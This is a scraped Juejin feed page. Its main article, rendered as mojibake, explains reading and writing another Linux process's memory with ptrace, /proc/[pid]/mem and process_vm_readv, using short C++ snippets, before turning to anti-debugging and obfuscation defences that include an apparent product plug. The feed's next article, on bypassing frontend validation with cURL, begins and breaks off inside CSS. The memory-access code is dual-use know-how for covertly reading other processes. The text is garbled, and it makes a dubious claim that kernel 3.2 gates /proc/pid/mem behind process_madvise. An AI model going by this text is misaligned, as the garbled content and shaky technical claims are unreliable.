            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/741508014680712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ·±ç›¾å®‰å…¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:15:14.000Z" title="Mon Dec 08 2025 03:15:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ çš„è¿›ç¨‹å†…å­˜ï¼ŒçœŸçš„å®‰å…¨å—ï¼Ÿ</p>
<p>å½“ä½ è¿è¡Œä¸€ä¸ªç¨‹åºæ—¶ï¼Œå®ƒçš„å†…å­˜æ•°æ®â€”â€”ä»ç”¨æˆ·è¾“å…¥åˆ°åŠ å¯†å¯†é’¥â€”â€”å¯¹å…¶ä»–è¿›ç¨‹æ¥è¯´å¯èƒ½å°±åƒä¸€æœ¬æ‘Šå¼€çš„ä¹¦ã€‚ä»Šå¤©æˆ‘ä»¬ä¸èŠç†è®ºï¼Œç›´æ¥æ‹†è§£ä¸‰ç§åœ¨ Linux ä¸‹è¯»å†™å…¶ä»–è¿›ç¨‹å†…å­˜çš„ç¡¬æ ¸æŠ€æœ¯ï¼Œæœ€åèŠèŠè¿™äº›å¹´æˆ‘åœ¨é˜²æŠ¤æ–¹æ¡ˆä¸Šè¸©è¿‡çš„å‘ã€‚</p>
<h2 data-id="heading-0">ptraceï¼šè€è€Œå¼¥åšçš„è°ƒè¯•ç¥å™¨</h2>
<p>ptrace æ˜¯ Linux ç³»ç»Ÿè°ƒç”¨çš„"ç‘å£«å†›åˆ€"ï¼Œgdbã€strace è¿™äº›å·¥å…·åº•å±‚éƒ½æ˜¯å®ƒåœ¨æ”¯æ’‘ã€‚å®ƒçš„å¨åŠ›åœ¨äºèƒ½å®Œå…¨æ§åˆ¶ç›®æ ‡è¿›ç¨‹çš„æ‰§è¡Œæµï¼Œä½†è¿™æŠŠåˆ€æœ‰ä¸ªè‡´å‘½å¼±ç‚¹ï¼š<strong>æ…¢</strong>ã€‚</p>
<h3 data-id="heading-1">æ ¸å¿ƒæœºåˆ¶</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ç²¾ç®€åçš„æ ¸å¿ƒå®ç°ï¼Œå»æ‰äº†ç¹ççš„é”™è¯¯å¤„ç†</span>
<span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-title">ptrace</span><span class="hljs-params">(PTRACE_PEEKDATA, pid, addr, <span class="hljs-literal">nullptr</span>)</span></span>;  <span class="hljs-comment">// è¯»</span>
<span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-title">ptrace</span><span class="hljs-params">(PTRACE_POKEDATA, pid, addr, data)</span></span>;     <span class="hljs-comment">// å†™</span>
</code></pre>
<p>æ¯æ¬¡åªèƒ½è¯»å†™ä¸€ä¸ª <code>long</code> ç±»å‹æ•°æ®ï¼Œå¤§æ‰¹é‡æ“ä½œå°±æ˜¯å™©æ¢¦ã€‚æ›´è¦å‘½çš„æ˜¯ï¼Œ<strong>ç›®æ ‡è¿›ç¨‹å¿…é¡»å¤„äº STOP çŠ¶æ€</strong>ï¼Œè¿™æ„å‘³ç€ä½ å¾—ä¸åœåœ°å‘ SIGSTOP/SIGCONT ä¿¡å·ï¼ŒåƒæŒ‰é¥æ§å™¨ä¸€æ ·æ§åˆ¶å¯¹æ–¹ã€‚å®æˆ˜ä¸­ï¼Œè¿™ç§é¢‘ç¹ä¸­æ–­ä¼šè®©ç›®æ ‡è¿›ç¨‹å¡é¡¿æ˜æ˜¾ï¼Œå®¹æ˜“è¢«å¯Ÿè§‰ã€‚</p>
<p>çœ‹çœ‹è¿™æ®µè¯»å†™å†…å­˜çš„ä»£ç ä½ å°±æ˜ç™½äº†ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">Tracer::readMemory</span><span class="hljs-params">(<span class="hljs-type">uintptr_t</span> addr, <span class="hljs-type">void</span>* buf, <span class="hljs-type">size_t</span> size)</span> </span>{
    <span class="hljs-type">size_t</span> done = <span class="hljs-number">0</span>;
    <span class="hljs-type">long</span> tmp;
    
    <span class="hljs-comment">// ä¸€æ¬¡è¯»ä¸€ä¸ª wordï¼Œå¾ªç¯åˆ°å¤©è’åœ°è€</span>
    <span class="hljs-keyword">while</span>(done &lt; size) {
        tmp = <span class="hljs-built_in">ptrace</span>(PTRACE_PEEKDATA, pid_, (<span class="hljs-type">void</span>*)addr, <span class="hljs-literal">nullptr</span>);
        <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">uint8_t</span>*)buf + done, &amp;tmp, <span class="hljs-built_in">sizeof</span>(tmp));
        addr += <span class="hljs-built_in">sizeof</span>(tmp);
        done += <span class="hljs-built_in">sizeof</span>(tmp);
    }
    <span class="hljs-keyword">return</span> done;
}
</code></pre>
<p><strong>å®æˆ˜å»ºè®®</strong>ï¼šptrace é€‚åˆå°æ•°æ®é‡ã€éœ€è¦ç²¾ç¡®æ§åˆ¶çš„åœºæ™¯ï¼Œæ¯”å¦‚ä¿®æ”¹æŸä¸ªå…³é”®è·³è½¬æŒ‡ä»¤ã€‚å¤§æ•°æ®é‡è¿˜æ˜¯åˆ«æŠ˜è…¾äº†ï¼Œä½ ä¼šåæ‚”çš„ã€‚</p>
<h2 data-id="heading-2">/proc/[pid]/memï¼šç›´æ¥æ“ä½œå†…å­˜çš„é»‘ç§‘æŠ€</h2>
<p>ç›¸æ¯” ptrace çš„"æ–‡æ˜"æ–¹å¼ï¼Œ/proc/pid/mem å°±æ˜¯ç›´æ¥ç ´é—¨è€Œå…¥ã€‚è¿™ä¸ªè™šæ‹Ÿæ–‡ä»¶æš´éœ²äº†è¿›ç¨‹çš„æ•´ä¸ªåœ°å€ç©ºé—´ï¼Œä½ å¯ä»¥ç”¨æ ‡å‡†çš„ <code>read/write</code> ç³»ç»Ÿè°ƒç”¨æ¥æ“ä½œï¼Œæ•ˆç‡ç”© ptrace å‡ æ¡è¡—ã€‚</p>
<h3 data-id="heading-3">å®ç°ç²¾å</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">ProcFile::openMemory</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">char</span> path[<span class="hljs-number">64</span>];
    <span class="hljs-built_in">snprintf</span>(path, <span class="hljs-built_in">sizeof</span>(path), <span class="hljs-string">"/proc/%d/mem"</span>, pid_);
    <span class="hljs-keyword">return</span> (mem_fd_ = <span class="hljs-built_in">open</span>(path, O_RDWR)) != <span class="hljs-number">-1</span>;  <span class="hljs-comment">// æ‹¿åˆ°æ–‡ä»¶æè¿°ç¬¦</span>
}

<span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">ProcFile::readMemory</span><span class="hljs-params">(<span class="hljs-type">intptr_t</span> addr, <span class="hljs-type">void</span>* buf, <span class="hljs-type">size_t</span> size)</span> </span>{
    <span class="hljs-built_in">kill</span>(pid_, SIGSTOP);           <span class="hljs-comment">// è¿˜æ˜¯å¾—åœï¼Œä½†åªåœä¸€æ¬¡</span>
    <span class="hljs-built_in">lseek</span>(mem_fd_, addr, SEEK_SET);
    <span class="hljs-type">size_t</span> bytes = <span class="hljs-built_in">read</span>(mem_fd_, buf, size);
    <span class="hljs-built_in">kill</span>(pid_, SIGCONT);
    <span class="hljs-keyword">return</span> bytes;
}
</code></pre>
<p>çœ‹åˆ°åŒºåˆ«äº†å—ï¼Ÿ<strong>ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨å°±èƒ½è¯»ä¸€å¤§å—å†…å­˜</strong>ï¼Œä¸ç”¨å¾ªç¯ã€‚æ€§èƒ½æ•æ„Ÿå‹åº”ç”¨æ›´åçˆ±è¿™ç§æ–¹æ³•ã€‚ä½†æ³¨æ„ï¼Œå†…æ ¸ä» 3.2 ç‰ˆæœ¬å¼€å§‹æ”¶ç´§äº†æƒé™ï¼Œç›´æ¥æ‰“å¼€ä¼šå¤±è´¥ï¼Œé™¤éä½ é€šè¿‡ <code>process_madvise</code> ç­‰ç‰¹æ®Šæ‰‹æ®µè·å–è®¿é—®æƒé™ã€‚</p>
<p><strong>è¸©å‘è®°å½•</strong>ï¼šå¾ˆå¤šæ–°æ‰‹ä»¥ä¸ºæ‰“å¼€ /proc/pid/mem å°±ä¸‡äº‹å¤§å‰ï¼Œç»“æœåœ¨ <code>lseek</code> æˆ– <code>read</code> æ—¶æ‰å‘ç°æƒé™ä¸è¶³ã€‚è®°ä½ï¼Œè¿™ä¸ªæ–‡ä»¶çš„å®é™…è®¿é—®æ§åˆ¶æ¯”æ–‡ä»¶æƒé™ä½å¤æ‚å¾—å¤šã€‚</p>
<h2 data-id="heading-4">process_vm_readvï¼šå†…æ ¸äº²å„¿å­API</h2>
<p>Linux 3.2 ä¹‹åå¼•å…¥çš„ <code>process_vm_readv/writev</code> æ˜¯å®˜æ–¹æ¨èçš„è·¨è¿›ç¨‹å†…å­˜è®¿é—®æ–¹æ¡ˆã€‚å®ƒç»“åˆäº†å‰ä¸¤ç§æ–¹æ³•çš„ä¼˜ç‚¹ï¼š<strong>æ•ˆç‡é«˜ã€æ— éœ€æš‚åœç›®æ ‡è¿›ç¨‹</strong>ã€‚</p>
<h3 data-id="heading-5">æç®€å®ç°</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">iovec</span> local = {buf, size};    <span class="hljs-comment">// æœ¬åœ°ç¼“å†²åŒº</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">iovec</span> remote = {(<span class="hljs-type">void</span>*)addr, size};  <span class="hljs-comment">// ç›®æ ‡è¿›ç¨‹åœ°å€</span>

<span class="hljs-comment">// ä¸€è¡Œä»£ç å®Œæˆè¯»å–ï¼Œç›®æ ‡è¿›ç¨‹æ— æ„ŸçŸ¥</span>
<span class="hljs-type">ssize_t</span> n = <span class="hljs-built_in">process_vm_readv</span>(pid, &amp;local, <span class="hljs-number">1</span>, &amp;remote, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
</code></pre>
<p>è¿™æ‰æ˜¯ç°ä»£ Linux ç³»ç»Ÿåº”è¯¥ç”¨çš„æ–¹æ¡ˆã€‚å®ƒé€šè¿‡å†…æ ¸ç›´æ¥æ‹·è´æ•°æ®ï¼Œé¿å…äº†é¢‘ç¹çš„è¿›ç¨‹çŠ¶æ€åˆ‡æ¢ã€‚<strong>æœ€çˆ½çš„æ˜¯ï¼Œç›®æ ‡è¿›ç¨‹ä¸éœ€è¦ STOP</strong>ï¼Œä½ å¯ä»¥åœ¨äººå®¶æ¯«ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è¯»æ•°æ®ã€‚è¿™åœ¨æŸäº›ç›‘æ§åœºæ™¯ä¸‹ç®€ç›´æ˜¯ç¥å™¨ã€‚</p>
<p>ä½†åˆ«é«˜å…´å¤ªæ—©ï¼Œè¿™ä¸ª API ä¹Ÿæœ‰è½¯è‚‹ï¼š<strong>æƒé™æ£€æŸ¥æå…¶ä¸¥æ ¼</strong>ã€‚ä½ åªèƒ½è®¿é—®æœ‰æƒé™çš„å†…å­˜åŒºåŸŸï¼Œè€Œä¸” SELinux ç­–ç•¥å¯èƒ½ä¼šç›´æ¥æ‹¦æˆªè¿™ä¸ªè°ƒç”¨ã€‚å®æˆ˜ä¸­ï¼Œå¾ˆå¤š"çœ‹ä¼¼å¯è¡Œ"çš„æ–¹æ¡ˆåˆ°äº†ç”Ÿäº§ç¯å¢ƒå°±å“‘ç«ï¼Œå°±æ˜¯å› ä¸ºå®‰å…¨ç­–ç•¥é™åˆ¶ã€‚</p>
<h2 data-id="heading-6">æ”»é˜²å¯¹æŠ—ï¼šé“é«˜ä¸€å°ºé­”é«˜ä¸€ä¸ˆ</h2>
<p>æå®‰å…¨ä¸èƒ½åªçœ‹æ”»å‡»é¢ï¼Œé˜²æŠ¤æ–¹æ¡ˆæ‰æ˜¯çœŸé‡‘ç™½é“¶ã€‚è¿™ä¸‰ç§æŠ€æœ¯éƒ½è¢«æ¶æ„è½¯ä»¶ç”¨çƒ‚äº†ï¼Œä»æœ¨é©¬ç›—å·åˆ°å¤–æŒ‚ä¿®æ”¹æ¸¸æˆæ•°æ®ï¼ŒåŸç†éƒ½ä¸€æ ·ï¼š<strong>æ”»å‡»è€…å¿…é¡»å…ˆæ‰¾åˆ°æœ‰ä»·å€¼çš„å†…å­˜åœ°å€</strong>ã€‚</p>
<h3 data-id="heading-7">æ”»å‡»è€…çš„æƒ¯ç”¨å¥—è·¯</h3>
<ol>
<li><strong>é™æ€åˆ†æ</strong>ï¼šåç¼–è¯‘ä½ çš„ç¨‹åºï¼Œæ‰¾å…³é”®å‡½æ•°å’Œå…¨å±€å˜é‡</li>
<li><strong>åŠ¨æ€è°ƒè¯•</strong>ï¼šç”¨ ptrace æˆ– gdb è·Ÿè¸ªå†…å­˜è®¿é—®</li>
<li><strong>ç‰¹å¾æ‰«æ</strong>ï¼šæœç´¢å†…å­˜ä¸­çš„ç‰¹å®šå­—ç¬¦ä¸²æˆ–æ•°æ®ç»“æ„</li>
</ol>
<h3 data-id="heading-8">é˜²æŠ¤æ€è·¯ï¼šè®©æ”»å‡»è€…æ‰¾ä¸åˆ°åŒ—</h3>
<p>ä¹‹å‰å¸®ä¸€ä¸ªé‡‘èå®¢æˆ·åšåŠ å›ºï¼Œè¯•è¿‡å‡ ç§å¼€æºæ–¹æ¡ˆæ•ˆæœéƒ½ä¸å¤ªç†æƒ³ï¼Œæœ€åç”¨äº† <strong>Virbox Protector</strong>ï¼Œä¸»è¦æ˜¯çœ‹ä¸­äº†å®ƒçš„å‡ ä¸ªå®æˆ˜ç‰¹æ€§ï¼š</p>
<p><strong>ä»£ç è™šæ‹ŸåŒ–</strong>ï¼šæŠŠæ ¸å¿ƒå‡½æ•°ç¿»è¯‘æˆè‡ªå®šä¹‰æŒ‡ä»¤é›†ï¼Œåœ¨è™šæ‹Ÿæœºé‡Œæ‰§è¡Œã€‚æ”»å‡»è€…é™æ€åˆ†æçœ‹åˆ°çš„æ˜¯å¤©ä¹¦ï¼ŒåŠ¨æ€è°ƒè¯•ä¹Ÿæ‰¾ä¸åˆ°æ ‡å‡†æŒ‡ä»¤ï¼Œæåº¦é…¸çˆ½ã€‚æˆ‘ä»¬æœ‰ä¸ªæ”¯ä»˜æ ¡éªŒå‡½æ•°ï¼Œè™šæ‹ŸåŒ–åIDA proæ ¹æœ¬è¯†åˆ«ä¸å‡ºé€»è¾‘ã€‚</p>
<p><strong>æ§åˆ¶æµæ··æ·†</strong>ï¼šé€šè¿‡å¹³å¦åŒ–+è™šå‡åˆ†æ”¯ï¼ŒæŠŠæ¸…æ™°çš„ if-else å˜æˆè¿·å®«ã€‚ä½ ä»¥ä¸ºåœ¨è°ƒ <code>check_license()</code>ï¼Ÿå…¶å®æ˜¯åœ¨èµ°è¿·å®«ï¼ŒçœŸæ­£çš„æ ¡éªŒè—åœ¨ç¬¬å…«å±‚ã€‚é…åˆ<strong>å¯¼å…¥è¡¨ä¿æŠ¤</strong>ï¼ŒæŠŠæ•æ„Ÿ API è°ƒç”¨éšè—èµ·æ¥ï¼Œè‡ªåŠ¨åŒ–åˆ†æå·¥å…·ç›´æ¥æŠ“çã€‚</p>
<p><strong>å†…å­˜åŠ å¯†+æ ¡éªŒ</strong>ï¼šå¯†é’¥ã€æ•æ„Ÿæ•°æ®åœ¨å†…å­˜ä¸­æ˜¯åŠ å¯†çš„ï¼Œç”¨æ—¶æ‰è§£å¯†ã€‚å³ä½¿æ”»å‡»è€…ç”¨ process_vm_readv  dump å†…å­˜ï¼Œæ‹¿åˆ°çš„ä¹Ÿæ˜¯ä¹±ç ã€‚è¿è¡Œæ—¶è¿˜ä¼šåšå†…å­˜å®Œæ•´æ€§æ ¡éªŒï¼Œå‘ç°è¢« patch ç›´æ¥è§¦å‘ç†”æ–­æœºåˆ¶ã€‚</p>
<p><strong>åè°ƒè¯•æ£€æµ‹</strong>ï¼šæ£€æµ‹ ptrace é™„åŠ è¡Œä¸ºï¼Œå‘ç°è°ƒè¯•å™¨ç›´æ¥é€€å‡ºæˆ–èµ°è™šå‡åˆ†æ”¯ã€‚è¿™æ‹›å¯¹ä»˜è„šæœ¬å°å­ç«‹ç«¿è§å½±ã€‚</p>
<h2 data-id="heading-9">æœ€åçš„è¯</h2>
<p>æŠ€æœ¯æœ¬èº«ä¸­æ€§ï¼Œptrace å¯ä»¥è°ƒè¯•ç”¨ï¼Œä¹Ÿå¯ä»¥å†™æœ¨é©¬ã€‚ä½œä¸ºå¼€å‘è€…ï¼Œç†è§£è¿™äº›æœºåˆ¶ä¸æ˜¯ä¸ºäº†æç ´åï¼Œè€Œæ˜¯çŸ¥é“æ•Œäººä»å“ªæ¥ï¼Œæ‰èƒ½ç­‘èµ·çœŸæ­£çš„é˜²çº¿ã€‚</p>
<p>åˆ«æŒ‡æœ›å•ä¸€æ–¹æ¡ˆèƒ½åŒ…æ‰“å¤©ä¸‹ã€‚æˆ‘è§è¿‡å¤ªå¤šé¡¹ç›®åªç”¨ä»£ç æ··æ·†ï¼Œç»“æœä¸€è¿è¡Œå°±è¢« dump å†…å­˜ï¼›ä¹Ÿè§è¿‡è¿‡åº¦åŠ å¯†å¯¼è‡´æ€§èƒ½å´©ç›˜ã€‚<strong>å®‰å…¨æ˜¯ç³»ç»Ÿå·¥ç¨‹ï¼Œéœ€è¦é™æ€ä¿æŠ¤+åŠ¨æ€æ£€æµ‹+è¿è¡Œæ—¶æ ¡éªŒçš„å¤šå±‚é˜²å¾¡</strong>ã€‚</p>
<p>ä½ çš„ç¨‹åºåœ¨æ”»å‡»è€…çœ¼é‡Œæ˜¯ä»€ä¹ˆéš¾åº¦ï¼Ÿæ˜¯ä¸€ç›®äº†ç„¶çš„è¯´æ˜ä¹¦ï¼Œè¿˜æ˜¯éœ€è¦èŠ±å‡ å‘¨æ—¶é—´æ‰èƒ½æ‘¸å‡ºé—¨é“çš„é»‘ç›’å­ï¼Ÿç­”æ¡ˆå–å†³äºä½ ä»Šå¤©çš„é€‰æ‹©ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆæ°¸è¿œä¸è¦ç›¸ä¿¡å‰ç«¯è¾“å…¥ï¼Ÿç»•è¿‡å‰ç«¯éªŒè¯ï¼Œåªéœ€ä¸€ä¸ª cURL å‘½ä»¤ï¼]]></title>    <link>https://juejin.cn/post/7580616979473367046</link>    <guid>https://juejin.cn/post/7580616979473367046</guid>    <pubDate>2025-12-08T03:21:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580616979473367046" data-draft-id="7580616979472826374" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆæ°¸è¿œä¸è¦ç›¸ä¿¡å‰ç«¯è¾“å…¥ï¼Ÿç»•è¿‡å‰ç«¯éªŒè¯ï¼Œåªéœ€ä¸€ä¸ª cURL å‘½ä»¤ï¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,å®‰å…¨"/> <meta itemprop="datePublished" content="2025-12-08T03:21:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ErpanOmer"/> <meta itemprop="url" content="https://juejin.cn/user/3878732754331096"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆæ°¸è¿œä¸è¦ç›¸ä¿¡å‰ç«¯è¾“å…¥ï¼Ÿç»•è¿‡å‰ç«¯éªŒè¯ï¼Œåªéœ€ä¸€ä¸ª cURL å‘½ä»¤ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3878732754331096/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ErpanOmer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:21:34.000Z" title="Mon Dec 08 2025 03:21:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid 